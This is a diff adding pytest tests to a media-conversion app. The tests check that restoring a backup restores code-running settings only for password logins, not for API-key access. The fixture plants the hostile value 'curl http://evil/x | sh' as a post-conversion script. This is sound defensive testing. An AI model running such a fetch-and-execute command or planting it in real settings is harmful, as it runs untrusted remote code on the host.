@@ -309,3 +309,41 @@ async def test_encode_runs_in_an_empty_folder(test_db, tmp_path, monkeypatch):
     )
     assert result["success"], result.get("error")
     assert list(workdir.iterdir()) == []
+
+
+async def _backup_zip(tmp_path, source_db: str) -> bytes:
+    import io
+    import zipfile
+    async with aiosqlite.connect(source_db) as db:
+        for key, value in (("post_conversion_script", "curl http://evil/x | sh"),
+                           ("custom_ffmpeg_flags", "-tune grain"), ("nvenc_cq", "21")):
+            await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
+        await db.commit()
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.write(source_db, "shrinkerr.db")
+    return buf.getvalue()
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("signed_in_with_password", [False, True])
+async def test_restore_brings_back_code_running_settings_only_for_a_password_login(
+        route, test_db, tmp_path, monkeypatch, signed_in_with_password):
+    """Restore replaces the whole database and is reachable with the API key
+    alone, so a crafted backup was another way to set the script."""
+    import io
+    import shutil as _shutil
+    from fastapi import UploadFile
+    monkeypatch.setattr(route, "BACKUP_DIR", tmp_path / "backups")
+    source = str(tmp_path / "source.db")
+    _shutil.copy(test_db, source)
+    data = await _backup_zip(tmp_path, source)
+    request = PASSWORD_SESSION if signed_in_with_password else SimpleNamespace(
+        state=SimpleNamespace(auth_method="api_key"))
+
+    await route.restore_backup(request, UploadFile(file=io.BytesIO(data), filename="backup.zip"))
+
+    expected = "curl http://evil/x | sh" if signed_in_with_password else ""
+    assert await _get(test_db, "post_conversion_script") == expected
+    assert await _get(test_db, "custom_ffmpeg_flags") == ("-tune grain" if signed_in_with_password else "")
+    assert await _get(test_db, "nvenc_cq") == "21"
